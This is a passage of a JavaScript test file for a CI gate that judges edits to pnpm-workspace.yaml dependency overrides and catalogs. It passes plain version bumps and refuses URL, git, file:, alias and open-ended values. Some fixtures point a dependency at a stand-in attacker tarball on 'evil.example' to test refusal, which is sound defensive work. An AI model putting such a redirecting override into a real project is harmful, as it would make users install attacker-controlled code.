  assert.deepEqual(wsFree(withUrl.replace('https://old.example/odd.tgz', 'https://evil.example/odd.tgz'), withUrl), [WS], 'but touching it is judged');
});

test('t/806: a NEW name with a plain version spec is free; with the switch off it is a gate change; a rename without a lockfile change is a gate change', () => {
  const off = (head) => workspaceFreeValuesOk(WS_BASE, head, { allowNewNames: false }).ok;
  assert.deepEqual(wsFree(wsReplace('overrides:\n', 'overrides:\n  brand-new: ">=1.0.0"\n')), [], 'a new override name');
  assert.deepEqual(wsFree(wsReplace('catalog:\n', 'catalog:\n  vue: ^3.0.0\n')), [], 'a new catalog name');
  assert.deepEqual(wsFree(wsReplace('    react: 17.0.0\n', '    react: 17.0.0\n    vue: 2.0.0\n')), [], 'a new catalogs entry');
  assert.deepEqual(wsFree(WS_BASE + '  second:\n    react: 16.0.0\n'), [], 'a new catalogs catalog');
  assert.equal(off(wsReplace('overrides:\n', 'overrides:\n  brand-new: ">=1.0.0"\n')), false, 'switch off: new name');
  // a rename is a removal plus a new name: the removal needs a lockfile or package.json change
  assert.deepEqual(wsFree(wsReplace('fast-xml-parser:', 'fast-xml-parser-2:')), [WS]);
  assert.deepEqual(decide([E(WS, undefined, 'modified'), E('pnpm-lock.yaml', undefined, 'modified')], { [WS]: { text: WS_BASE } }, { [WS]: { text: wsReplace('fast-xml-parser:', 'fast-xml-parser-2:') }, 'pnpm-lock.yaml': { text: 'x' } }), []);
  // the same new name with a URL is refused in either mode
  assert.equal(workspaceFreeValuesOk(WS_BASE, wsReplace('overrides:\n', 'overrides:\n  brand-new: https://evil.example/x.tgz\n'), { allowNewNames: true }).ok, false);
});

test('t/806: with WORKSPACE_FREE_ALLOW_NEW_NAMES a new name passes only with a plain version spec (the switch, backtested on the real history)', () => {
  assert.equal(WORKSPACE_FREE_ALLOW_NEW_NAMES, true, 'decided: a new name with a plain version spec is free (Lead p/233#333, Security p/131#138)');
  const head = wsReplace('overrides:\n', 'overrides:\n  brand-new: ">=1.0.0 <2"\n');
  assert.equal(workspaceFreeValuesOk(WS_BASE, head).ok, true);
  assert.equal(workspaceFreeValuesOk(WS_BASE, head, { allowNewNames: false }).ok, false);
  // the real shapes of the historical bumps that ADD a name (values as committed on main)
  for (const entry of ['">=4.35.0"', '">=7.0.0 <7.30.1"', '">=7.1.0 <8"', '">=5.0.0 <5.1.0"', '"^2.0.0"']) {
    assert.equal(workspaceFreeValuesOk(WS_BASE, wsReplace('overrides:\n', `overrides:\n  newcve: ${entry}\n`), { allowNewNames: true }).ok, true, entry);
  }
});

test('t/806 fail closed: an unparseable overrides, catalog or catalogs block (either side) is a gate change', () => {
  for (const bad of [
    'overrides: {axios: ">=1.0.0"}\n', 'overrides:\n    axios: 1.0.0\n', 'overrides:\n  axios\n', 'overrides:\n  axios: 1.0.0\n    nested: 1\n', 'catalogs:\n  legacy: 17.0.0\n', 'catalogs:\n  legacy:\n      react: 17.0.0\n',
    'catalog:\n  - react\n', 'overrides:\n\t axios: 1.0.0\n', 'overrides: oops\n',
  ]) {
    assert.deepEqual(wsFree(bad), [WS], `head: ${JSON.stringify(bad.slice(0, 30))}`);
    assert.deepEqual(wsFree(WS_BASE, bad), [WS], `base: ${JSON.stringify(bad.slice(0, 30))}`);
  }
  assert.deepEqual(decide([E(WS, undefined, 'modified')], { [WS]: { text: WS_BASE } }, { [WS]: { error: new Error('502') } }), [WS]);
});

test('t/806: the real pnpm-workspace.yaml parses into its free entries (so a real bump is judged, not failed closed by the parser)', () => {
  const real = fs.readFileSync(path.join(ROOT_DIR, 'pnpm-workspace.yaml'), 'utf8');
  const r = workspaceFreeEntriesOf(real);
  assert.equal(r.ok, true);
  assert.ok(r.entries.size > 20, `read ${r.entries.size} entries`);
  assert.ok([...r.entries.keys()].every((k) => /^(overrides|catalog|catalogs):/.test(k)));
  // bumping one real override to a higher plain version is free; pointing it at a URL is not
  const [firstKey] = [...r.entries.entries()].find(([k, v]) => k.startsWith('overrides:') && /^[>=^~\d]/.test(v) && !k.includes(' '));
  const name = firstKey.slice('overrides:'.length);
  const esc = name.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&');
  const lineRe = new RegExp(`^(\\s+["']?${esc}["']?:\\s*)(.+)$`, 'm');
  assert.ok(lineRe.test(real), `found the ${name} line`);
  assert.deepEqual(decide([E(WS, undefined, 'modified')], { [WS]: { text: real } }, { [WS]: { text: real.replace(lineRe, '$1"^999.0.0"') } }), []);
  assert.deepEqual(decide([E(WS, undefined, 'modified')], { [WS]: { text: real } }, { [WS]: { text: real.replace(lineRe, '$1"https://evil.example/x.tgz"') } }), [WS]);
});

test('t/806: workspaceFreeEntriesOf on its own', () => {
  const r = workspaceFreeEntriesOf(WS_BASE);
  assert.equal(r.ok, true);
  assert.deepEqual([...r.entries.entries()], [
    ['overrides:axios', '>=1.20.0 <2'], ['overrides:fast-xml-parser', '>=5.12.0 <5.13.0'], ['overrides:@azure/msal-node', '>=7.1.0 <8'],
    ['catalog:react', '^18.0.0'], ['catalogs:legacy:react', '17.0.0'],
  ]);
  assert.equal(workspaceFreeEntriesOf(undefined).ok, false);
  assert.deepEqual([...workspaceFreeEntriesOf('packages:\n  - a\nignoreScripts: true\n').entries], [], 'other keys are not free entries');
});

// ── t/806 amend (Lead p/233#333/#334, Security p/131#138) ──

test('t/806: a removed override, catalog or catalogs entry is free only with a package.json or pnpm-lock.yaml change in the same PR', () => {
  const rm = (from) => wsReplace(from, '');
  const withFile = (f) => decide([E(WS, undefined, 'modified'), E(f, undefined, 'modified')], { [WS]: { text: WS_BASE }, [f]: { text: 'a' } }, { [WS]: { text: rm('  axios: ">=1.20.0 <2"\n') }, [f]: { text: 'b' } });
  assert.deepEqual(wsFree(rm('  axios: ">=1.20.0 <2"\n')), [WS], 'alone');
  assert.deepEqual(wsFree(rm('  react: ^18.0.0\n')), [WS], 'a catalog removal alone');
  assert.deepEqual(wsFree(rm('    react: 17.0.0\n')), [WS], 'a catalogs removal alone');
  assert.deepEqual(withFile('pnpm-lock.yaml'), [], 'with a root lockfile');
  assert.deepEqual(withFile('taxonomy-editor/pnpm-lock.yaml'), [], 'with a nested lockfile');
  assert.deepEqual(withFile('package.json').filter((p) => p === WS), [], 'with a package.json (its own scripts check still applies)');
  assert.deepEqual(wsFree(rm('  axios: ">=1.20.0 <2"\n').replace('<5.13.0', '<5.14.0')), [WS], 'a removal plus an edit, alone');
  // an unrelated file does not license a removal
  assert.deepEqual(withFile('README.md'), [WS]);
});

test('t/806: NAMED refusals of a changed override, catalog or catalogs value', () => {
  const named = {
    'npm: alias': 'npm:other@1.0.0', 'file:': 'file:../x', 'link:': 'link:../x', 'git+https': 'git+https://github.com/x/y.git#abc', 'github:': 'github:owner/repo',
    'http URL': 'http://example.com/a', 'https URL': 'https://example.com/a', 'tarball URL': 'https://example.com/x.tgz', 'workspace:*': 'workspace:*', 'workspace:^': 'workspace:^1.0.0',
  };
  for (const [label, bad] of Object.entries(named)) {
    assert.deepEqual(wsFree(wsReplace('>=1.20.0 <2', bad)), [WS], `overrides ${label}`);
    assert.deepEqual(wsFree(wsReplace('react: ^18.0.0', `react: "${bad}"`)), [WS], `catalog ${label}`);
    assert.deepEqual(wsFree(wsReplace('react: 17.0.0', `react: '${bad}'`)), [WS], `catalogs ${label}`);
    assert.deepEqual(wsFree(wsReplace('overrides:\n', `overrides:\n  brand-new: "${bad}"\n`)), [WS], `NEW name ${label}`);
  }
  // a nested object value under an override name is unparseable, so a gate change
  assert.deepEqual(wsFree(wsReplace('  axios: ">=1.20.0 <2"\n', '  axios:\n    version: 1.0.0\n')), [WS], 'overrides nested object');
  assert.deepEqual(wsFree(wsReplace('  react: ^18.0.0\n', '  react:\n    version: 1.0.0\n')), [WS], 'catalog nested object');
  assert.deepEqual(wsFree(wsReplace('    react: 17.0.0\n', '    react:\n      version: 1.0.0\n')), [WS], 'catalogs nested object');
});

test('t/806: an open-ended override value (no concrete lower bound) is a gate change, a legitimate one is free', () => {
  for (const bad of ['*', 'x', 'X', '>=0', '>0', '>=0.0.0', '>0.0.0', '0.x', '^0', '~0', '0.0.0-0', '<2', '<=1.0.0', '>=0 <2', '1.0.0 || *', '1.0.0 || >=0']) {
    assert.deepEqual(wsFree(wsReplace('>=1.20.0 <2', bad)), [WS], `overrides axios -> ${bad}`);
    assert.deepEqual(wsFree(wsReplace('react: ^18.0.0', `react: "${bad}"`)), [WS], `catalog -> ${bad}`);
  }
  assert.deepEqual(wsFree(wsReplace('>=1.20.0 <2', '')), [WS], 'an empty value');
  for (const ok of ['^1.2.3', '~0.5.1', '>=7.0.0 <11.0.1', '1.2.3 - 2.0.0', '1.x', '^0.0.3', '>=1.20.0 <2', '1.0.0 || ^2.0.0', '>=4.35.0']) {
    assert.deepEqual(wsFree(wsReplace('>=1.20.0 <2', ok)), [], `overrides axios -> ${ok}`);
  }
});
